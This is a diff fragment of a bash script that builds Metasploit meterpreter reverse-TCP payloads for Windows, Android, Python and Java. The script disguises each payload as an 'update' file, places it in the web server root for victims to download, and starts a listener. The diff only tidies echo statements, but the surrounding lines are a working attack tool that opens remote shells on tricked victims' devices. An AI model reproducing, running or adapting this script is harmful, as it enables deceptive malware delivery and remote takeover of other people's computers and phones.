@@ -69,33 +69,25 @@ read x
 if [ "$x" == "$exe" ]; then                    
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > /root/Desktop/update.exe
 	mv /root/Desktop/update.exe /var/www/html
-echo -e '
-Waiting for listener...
-'
+echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 # 2
 elif [ "$x" == "$apk" ]; then                          
 msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.apk
 	mv /root/Desktop/update.apk /var/www/html
-echo -e '
-Waiting for listener...
-'
+echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 # 3
 elif [ "$x" == "$py" ]; then                       
 msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
 	mv /root/Desktop/update.py /var/www/html
-echo -e '
-Waiting for listener...
-'
+echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 # 4
 elif [ "$x" == "$jar" ]; then                        
 msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/update.jar
 	mv /root/Desktop/update.jar /var/www/html
-echo -e '
-Waiting for listener...
-'
+echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 # 5	
